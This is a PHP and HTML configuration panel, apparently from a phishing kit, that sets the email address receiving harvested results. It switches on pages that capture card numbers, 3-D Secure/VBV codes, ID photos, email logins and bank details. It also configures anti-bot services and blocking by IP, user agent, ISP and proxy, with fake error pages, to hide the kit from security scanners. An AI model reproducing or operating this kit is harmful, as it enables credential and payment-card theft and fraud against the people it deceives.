<?php

$config = get_config();

if(isset($_GET['save']))
{
    $except = ['submit'];
    @save_config($_POST , $except);
    unset($_POST);
        echo "<script>alert('config updated' );  window.location.href='?rp=configuration'; </script>";
    
}

?>
<form action="?rp=configuration&save" method="POST">
   
        <div>
        <div class="grid grid-cols-1 md:grid-cols-12 gap-8 mt-10 bg-white shadow-xl rounded-lg p-5">
            <div class="col-span-1 md:col-span-4">
                <div class="grid grid-rows-none gap-4">
                <div class="flex flex-col">
                        <label for="email_result">Email result</label>
                        <input id="email_result" name="email_result" class="appearance-none dark:bg-gray-900 border border-gray-700 rounded py-2 px-3 text-gray-900 dark:text-white  label-floating" value="<?=@$config['email_result'];?>" autocomplete="off">
                    </div>
                    <div class="flex flex-col">
                        <label for="parameter">Parameter</label>
                        <input id="parameter" name="parameter" class="appearance-none dark:bg-gray-900 border border-gray-700 rounded py-2 px-3 text-gray-900 dark:text-white  label-floating" placeholder="ryu" value="<?=$config['parameter'];?>" autocomplete="off">
                    </div>
                    <div class="flex flex-col">
                        <label for="default_lang">Default Language</label>
                       <select name="default_lang" id="default_lang" class="select2" style="width: 100%">
                           <option value="en">English</option>
                       </select>
                    </div>
                    <?php
                    if(ryu_config('CONFIG_ONOFF' , 'page_case') == true){
                        ?>
                    <div class="flex flex-col">
                        <label for="case">Case</label>
                        <select name="case" id="case" class="select2" style="width: 100%">
                            <option value="invoice">Invoice</option>
                            <option value="locked">Locked</option>
                            <option value="verify">Verify</option>
    
                        </select>
                    </div>
                    <?php
                    }
                    ?>
                    <div class="flex flex-col">
                        <label for="blocked_page">Page Blocked display</label>
                        <select name="blocked_page" id="blocked_page" class="select2" style="width: 100%">
                            <option value="403">403 Forbidden</option>
                            <option value="tcp">TCP Network error</option>
                            <option value="suspend">Account suspended</option>
    
                        </select>
    
                    </div>
                    <div class="flex flex-col">
                        <label for="antibot">API Antibot ( optional )</label>
                        <input id="antibot" name="antibot" class="appearance-none dark:bg-gray-900 border border-gray-700 rounded py-2 px-3 text-gray-900 dark:text-white  label-floating" placeholder="XXXX" autocomplete="off">
                    </div>
                    <div class="flex flex-col">
                        <label for="killbot">API Killbot ( optional )</label>
                        <input id="killbot" name="killbot" class="appearance-none dark:bg-gray-900 border border-gray-700 rounded py-2 px-3 text-gray-900 dark:text-white  label-floating" placeholder="XXX" autocomplete="off">
                    </div>
                       <div class="flex flex-col">
                        <label for="ipstack">API IPStack ( optional )</label>
                        <input id="ipstack" name="ipstack" class="appearance-none dark:bg-gray-900 border border-gray-700 rounded py-2 px-3 text-gray-900 dark:text-white  label-floating" placeholder="XXX" autocomplete="off">
                    </div>
                </div>
            </div>
            <div class="col-span-1 md:col-span-4">
                <div class="grid grid-rows-none gap-4">
                  
                    <div class="flex flex-col gap-y-1">
                        <label for="sangger">Double Card</label>
                        <?php echo radio($config,'double_card'); ?>
                    </div>
                    <?php
                    if(ryu_config('CONFIG_ONOFF','page_vbv') == true){
                        ?>
                    <div class="flex flex-col gap-y-1">
                        <label for="sangger">Get 3dsecure / VBV</label>
                        <?php echo radio($config,'3dsecure'); ?>
                    </div>
                    <?php
                    }
                    if(ryu_config('CONFIG_ONOFF', 'page_photo') == true){
                        ?>
                    <div class="flex flex-col gap-y-1">
                        <label for="sangger">Get Photo</label>
                        <?php echo radio($config,'pap'); ?>
                    </div>
                    <?php
                    }
                    if(ryu_config('CONFIG_ONOFF' , 'page_email') == true){
                        ?>
                    <div class="flex flex-col gap-y-1">
                        <label for="sangger">Get Email</label>
                        <?php echo radio($config,'email'); ?>
                    </div>
                    <?php
                    }
                    if(ryu_config('CONFIG_ONOFF' , 'page_bank') == true){
                        ?>
                    <div class="flex flex-col gap-y-1">
                        <label for="sangger">Get Bank</label>
                        <?php echo radio($config,'bank'); ?>
                    </div>
                    <?php
                    }
                    ?>
                    <div class="flex flex-col gap-y-1">
                        <label for="sangger">Lock Language</label>
                        <?php echo radio($config,'lock_lang'); ?>
                    </div>
                </div>
            </div>
            <div class="col-span-1 md:col-span-4">
                <div class="grid grid-rows-none gap-4">
    
                    <div class="flex flex-col gap-y-1">
                        <label for="one_time">One Time Access</label>
                        <?php echo radio($config,'one_time'); ?>
                    </div>
                    <div class="flex flex-col gap-y-1">
                        <label for="sangger">Send Login</label>
                        <?php echo radio($config,'send_login'); ?>
                    </div>
    
                    <div class="flex flex-col gap-y-1">
                        <label for="sangger">Blocker IPs</label>
                       <?php echo radio($config,'ip'); ?>
                    </div>
                    <div class="flex flex-col gap-y-1">
                        <label for="sangger">Blocker UserAgent</label>
                        <?php echo radio($config,'agent'); ?>
                    </div>
                    <div class="flex flex-col gap-y-1">
                        <label for="sangger">Blocker Hostname</label>
                        <?php echo radio($config,'host'); ?>
                    </div>
                    <div class="flex flex-col gap-y-1">
                        <label for="sangger">Blocker ISP</label>
                        <?php echo radio($config,'isp'); ?>
                    </div>
                    <div class="flex flex-col gap-y-1">
                        <label for="sangger">Blocker Proxy</label>
                        <?php echo radio($config,'proxy'); ?>
                    </div>
                </div>
            </div>
            <div class="col-span-1 md:col-span-3">
                <button type="submit" class="w-full bg-green-500 text-white rounded-full py-2">Save config</button>
            </div>
        </div>
    </div>
    </form>